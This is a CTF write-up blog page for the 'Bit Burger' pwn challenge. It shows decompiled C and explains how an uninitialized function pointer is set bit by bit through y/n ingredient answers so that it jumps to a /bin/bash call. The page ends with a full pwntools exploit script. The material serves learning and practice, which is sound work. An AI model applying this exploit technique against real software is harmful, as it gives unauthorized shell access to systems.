@@ -1,0 +1,243 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PWN bit Bit Burger | Salad の Blog</title><meta name="author" content="salad07"><meta name="copyright" content="salad07"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="title: PWN bit Bit Burgerdate: 2025-04-02type: “categories”categories:  - CTF  - PWN title: PWN bit Bit Burgerdate: 2025-03-24type: “categories”categories:  - CTF  - PWNsource code  12345678910111213">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN bit Bit Burger">
+<meta property="og:url" content="http://example.com/2025/04/02/PWN%20bit%20Bit%20Burger/index.html">
+<meta property="og:site_name" content="Salad の Blog">
+<meta property="og:description" content="title: PWN bit Bit Burgerdate: 2025-04-02type: “categories”categories:  - CTF  - PWN title: PWN bit Bit Burgerdate: 2025-03-24type: “categories”categories:  - CTF  - PWNsource code  12345678910111213">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2025-04-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-01T20:23:53.125Z">
+<meta property="article:author" content="salad07">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="http://example.com/2025/04/02/PWN%20bit%20Bit%20Burger/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PWN bit Bit Burger',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-04-02 04:23:53'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/diaries"><i class="fa-fw fa fa-book"></i><span> diaries</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/post.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="Salad の Blog"><span class="site-name">Salad の Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/diaries"><i class="fa-fw fa fa-book"></i><span> diaries</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN bit Bit Burger</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-04-01T16:00:00.000Z" title="Created 2025-04-02 00:00:00">2025-04-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-04-01T20:23:53.125Z" title="Updated 2025-04-02 04:23:53">2025-04-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">1.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>5min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PWN bit Bit Burger"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><hr>
+<h2 id="title-PWN-bit-Bit-Burgerdate-2025-04-02type-“categories”categories-CTF-PWN"><a href="#title-PWN-bit-Bit-Burgerdate-2025-04-02type-“categories”categories-CTF-PWN" class="headerlink" title="title: PWN bit Bit Burgerdate: 2025-04-02type: “categories”categories:  - CTF  - PWN"></a>title: PWN bit Bit Burger<br>date: 2025-04-02<br>type: “categories”<br>categories:<br>  - CTF<br>  - PWN</h2><hr>
+<h2 id="title-PWN-bit-Bit-Burgerdate-2025-03-24type-“categories”categories-CTF-PWN"><a href="#title-PWN-bit-Bit-Burgerdate-2025-03-24type-“categories”categories-CTF-PWN" class="headerlink" title="title: PWN bit Bit Burgerdate: 2025-03-24type: “categories”categories:  - CTF  - PWN"></a>title: PWN bit Bit Burger<br>date: 2025-03-24<br>type: “categories”<br>categories:<br>  - CTF<br>  - PWN</h2><p>source code </p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 take_order()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int8 v1; // <span class="selector-attr">[rsp+7h]</span> <span class="selector-attr">[rbp-19h]</span> BYREF</span><br><span class="line">  unsigned __int64 v2; // <span class="selector-attr">[rsp+8h]</span> <span class="selector-attr">[rbp-18h]</span></span><br><span class="line">  unsigned __int64 <span class="selector-tag">i</span>; // <span class="selector-attr">[rsp+10h]</span> <span class="selector-attr">[rbp-10h]</span></span><br><span class="line">  unsigned __int64 v4; // <span class="selector-attr">[rsp+18h]</span> <span class="selector-attr">[rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0</span>x28u);</span><br><span class="line">  v2 = <span class="number">0</span>LL;</span><br><span class="line">  puts(&quot;What would you like on your Bit Burger?&quot;);</span><br><span class="line">  for ( <span class="selector-tag">i</span> = <span class="number">0</span>LL; <span class="selector-tag">i</span> &lt;= <span class="number">0</span>x17; ++<span class="selector-tag">i</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot; - %s (y/n)? &quot;, (&amp;ingredients)<span class="selector-attr">[i]</span>);</span><br><span class="line">    __isoc99_scanf(&quot;%c%*c&quot;, &amp;v1);</span><br><span class="line">    if ( v1 == <span class="number">36</span> )</span><br><span class="line">      manager_control_panel();</span><br><span class="line">    if ( v1 != <span class="number">121</span> &amp;&amp; v1 != <span class="number">110</span> )</span><br><span class="line">      printf(&quot;<span class="selector-tag">I</span>&#x27;m not sure what &#x27;%c&#x27; means. Goodbye!\n&quot;, v1);</span><br><span class="line">    if ( v1 == <span class="number">121</span> )</span><br><span class="line">      v2 |= <span class="number">1</span> &lt;&lt; <span class="selector-tag">i</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;\nGot it! One Bit Burger with &quot;);</span><br><span class="line">  for ( <span class="selector-tag">i</span> = <span class="number">0</span>LL; <span class="selector-tag">i</span> &lt;= <span class="number">23</span>; ++<span class="selector-tag">i</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (v2 &amp; (<span class="number">1</span> &lt;&lt; <span class="selector-tag">i</span>)) != <span class="number">0</span> )</span><br><span class="line">      printf(&quot;%s, &quot;, (&amp;ingredients)<span class="selector-attr">[i]</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;comin&#x27; <span class="attribute">right</span> up!\n&quot;);</span><br><span class="line">  return v4 - __readfsqword(<span class="number">0</span>x28u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 choose_style()</span><br><span class="line">&#123;</span><br><span class="line">  void (*v1)(void); // <span class="selector-attr">[rsp+8h]</span> <span class="selector-attr">[rbp-18h]</span></span><br><span class="line">  char s1<span class="selector-attr">[8]</span>; // <span class="selector-attr">[rsp+10h]</span> <span class="selector-attr">[rbp-10h]</span> BYREF</span><br><span class="line">  unsigned __int64 v3; // <span class="selector-attr">[rsp+18h]</span> <span class="selector-attr">[rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0</span>x28u);</span><br><span class="line">  printf(&quot;Would you like that grilled or fried?: <span class="string">&quot;);</span></span><br><span class="line"><span class="string">  __isoc99_scanf(&quot;</span>%<span class="number">7s</span><span class="string">&quot;, s1);</span></span><br><span class="line"><span class="string">  if ( !strcmp(s1, &quot;</span>grilled<span class="string">&quot;) )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    v1 = (void (*)(void))grilled;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else if ( !strcmp(s1, &quot;</span>fried<span class="string">&quot;) )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    v1 = (void (*)(void))fried;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    printf(&quot;</span>Sorry, we don<span class="string">&#x27;t serve %s Bit Burgers here.\n&quot;, s1);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  v1();</span></span><br><span class="line"><span class="string">  return v3 - __readfsqword(0x28u);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>process<br>order then print and check<br><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/Pasted%20image%2020250324172336.png"><br>u can use $ to jump admin if have passcode<br><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/Pasted%20image%2020250324172404.png"></p>
+<p>but impossible because need PID + random </p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 manager_control_panel()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ebx</span><br><span class="line">  __pid_t v1; // eax</span><br><span class="line">  int v3; // <span class="selector-attr">[rsp+0h]</span> <span class="selector-attr">[rbp-20h]</span> BYREF</span><br><span class="line">  int v4; // <span class="selector-attr">[rsp+4h]</span> <span class="selector-attr">[rbp-1Ch]</span></span><br><span class="line">  unsigned __int64 v5; // <span class="selector-attr">[rsp+8h]</span> <span class="selector-attr">[rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0</span>x28u);</span><br><span class="line">  v0 = <span class="selector-tag">time</span>(<span class="number">0</span>LL);</span><br><span class="line">  v1 = getpid();</span><br><span class="line">  srand(v0 ^ v1);</span><br><span class="line">  v4 = rand() % <span class="number">1000000</span>;</span><br><span class="line">  printf(&quot;Enter manager access <span class="selector-tag">code</span>: <span class="string">&quot;);</span></span><br><span class="line"><span class="string">  __isoc99_scanf(&quot;</span>%d<span class="string">&quot;, &amp;v3);</span></span><br><span class="line"><span class="string">  if ( v4 != v3 )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    puts(&quot;</span>Incorrect code. Get back to work, frycook!<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    exit(0);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  puts(&quot;</span>Access granted, starting management interface.<span class="string">&quot;);</span></span><br><span class="line"><span class="string">  execl(&quot;</span>/bin/bash<span class="string">&quot;, &quot;</span>/bin/bash<span class="string">&quot;, 0LL);</span></span><br><span class="line"><span class="string">  return v5 - __readfsqword(0x28u);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>HOW ?<br>the main point is after grilled and fried checking, there is a v1 function call</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Sorry, we don&#x27;t serve %s Bit Burgers here.\n&quot;, s1);</span><br><span class="line">  &#125;</span><br><span class="line">  v1();</span><br></pre></td></tr></table></figure>
+
+<p>so here can jump to the function address 0x401346<br>which is &#x2F;bin&#x2F;bash<br><img src="https://cdn.jsdelivr.net/gh/saladbkp/blog_img/img/Pasted%20image%2020250324172553.png"></p>
+<p>BUT how to construct the address </p>
+<p>NEW KNOWLEDGE<br>they using v1 <code>void (*v1)(void);</code></p>
+<p>from discord </p>
+<blockquote>
+<ol>
+<li>just leave func pointer uninitialized, so the pointer will be your bitarray of chosen dishes, and you can control pointer by writing 3 bytes bit-by-bit (y &#x3D; 1 and n &#x3D; 0)</li>
+</ol>
+</blockquote>
+<p>from deepseek<br>这个解法的核心是 <strong>利用未初始化的函数指针</strong>，并通过 <strong>逐位构造目标地址</strong> 来控制程序执行流程。以下是详细解释：</p>
+<hr>
+<h3 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. <strong>漏洞背景</strong></h3><ul>
+<li><p><strong>未初始化的函数指针</strong>：在 <code>choose_style</code> 函数中，如果用户输入既不是 <code>&quot;grilled&quot;</code> 也不是 <code>&quot;fried&quot;</code>，函数指针 <code>v1</code> 未被初始化，保留的是栈上的残留数据。</p>
+</li>
+<li><p><strong>残留数据可控</strong>：程序可能通过其他部分的输入（如之前的用户选择）向栈中写入数据。这些残留数据可以通过精心构造的输入来控制。</p>
+</li>
+</ul>
+<hr>
+<h3 id="2-攻击思路"><a href="#2-攻击思路" class="headerlink" title="2. 攻击思路"></a>2. <strong>攻击思路</strong></h3><ul>
+<li><p><strong>通过逐位输入构造地址</strong>：程序在之前的交互中（例如多次回答 “y&#x2F;n” 问题），可能将用户的选择存储在栈的某个位置。通过回答 “y”（表示 1）或 “n”（表示 0），可以逐位构造一个目标地址（如 <code>0x401346</code>）。</p>
+</li>
+<li><p><strong>覆盖未初始化的函数指针</strong>：当 <code>v1</code> 未被初始化时，它会使用栈上的残留数据作为函数指针。通过控制这些残留数据，可以让 <code>v1</code> 指向攻击者构造的地址（如 <code>0x401346</code>）。</p>
+</li>
+<li><p><strong>触发函数调用</strong>：调用 <code>v1()</code> 时，程序跳转到构造的地址执行。</p>
+</li>
+</ul>
+<p>MY OWN WORD:<br>v1 uninitialized, so it will use the last pointer it has and the last pointer is based on our dish choice </p>
+<p>so now we need to let our dish choice become 0x401346</p>
+<p>there got 24 dishes<br>address of 0x401346 is<br>0100 0000 0001 0011 0100 0110 (from back to front)<br>so y is 1 n is 0<br>the dish list also have <code>if ( (v2 &amp; (1 &lt;&lt; i)) != 0 )</code></p>
+<p>FULL CODE</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">from</span> pwn import *</span><br><span class="line"></span><br><span class="line"># Allows you <span class="selector-tag">to</span> switch between local/GDB/remote <span class="selector-tag">from</span> terminal</span><br><span class="line">def start(argv=<span class="selector-attr">[]</span>, *<span class="selector-tag">a</span>, **kw):</span><br><span class="line">    if args.GDB:  # Set GDBscript below</span><br><span class="line">        return gdb.<span class="built_in">debug</span>([exe] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    elif args.REMOTE:  # (<span class="string">&#x27;server&#x27;</span>, <span class="string">&#x27;port&#x27;</span>)</span><br><span class="line">        return <span class="built_in">remote</span>(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    else:  # Run locally</span><br><span class="line">        return <span class="built_in">process</span>([exe] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Specify your GDB script here for debugging</span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = <span class="string">&quot;./bit_burger.bin&quot;</span></span><br><span class="line">#libc = <span class="built_in">ELF</span>(<span class="string">&quot;./libc.so.6_32&quot;</span>)</span><br><span class="line"># This will automatically get context arch, bits, os etc</span><br><span class="line">elf = context.binary = <span class="built_in">ELF</span>(exe, checksec=False)</span><br><span class="line"># Change logging level to help with debugging (error/warning/info/debug)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = <span class="built_in">start</span>()</span><br><span class="line"></span><br><span class="line">def <span class="built_in">main</span>():</span><br><span class="line">    number = <span class="number">0</span>x401346</span><br><span class="line">    for i in <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;(1 &lt;&lt; i)&quot;</span>,(<span class="number">1</span> &lt;&lt; i))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;number&quot;</span>,<span class="built_in">hex</span>(number))</span><br><span class="line">        if (<span class="number">1</span> &lt;&lt; i) &amp; number == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">            io.<span class="built_in">sendlineafter</span>(b<span class="string">&quot;(y/n)?&quot;</span>, b<span class="string">&quot;n&quot;</span>)</span><br><span class="line">        else:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">            io.<span class="built_in">sendlineafter</span>(b<span class="string">&quot;(y/n)?&quot;</span>, b<span class="string">&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line">    io.<span class="built_in">sendlineafter</span>(b<span class="string">&quot;grilled or fried?: &quot;</span>, b<span class="string">&quot;hehe&quot;</span>)</span><br><span class="line"></span><br><span class="line">if __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br><span class="line">    io.<span class="built_in">interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">salad07</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/02/PWN%20bit%20Bit%20Burger/">http://example.com/2025/04/02/PWN%20bit%20Bit%20Burger/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="whatsapp,linkedin,wechat"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/04/01/DiceCTF%20debugalyzer%20GDB%20script%20+%20z3/" title="DiceCTF debugalyzer GDB script + z3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">DiceCTF debugalyzer GDB script + z3</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">salad07</div><div class="author-info__description">为了ta 拼尽全力</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/saladbkp"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">SUP, a student who 24/7 fixing bugs, 努力从小白进化成小小白, 頑張れ~ 🔥</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#title-PWN-bit-Bit-Burgerdate-2025-04-02type-%E2%80%9Ccategories%E2%80%9Dcategories-CTF-PWN"><span class="toc-number">1.</span> <span class="toc-text">title: PWN bit Bit Burgerdate: 2025-04-02type: “categories”categories:  - CTF  - PWN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#title-PWN-bit-Bit-Burgerdate-2025-03-24type-%E2%80%9Ccategories%E2%80%9Dcategories-CTF-PWN"><span class="toc-number">2.</span> <span class="toc-text">title: PWN bit Bit Burgerdate: 2025-03-24type: “categories”categories:  - CTF  - PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-number">2.1.</span> <span class="toc-text">1. 漏洞背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 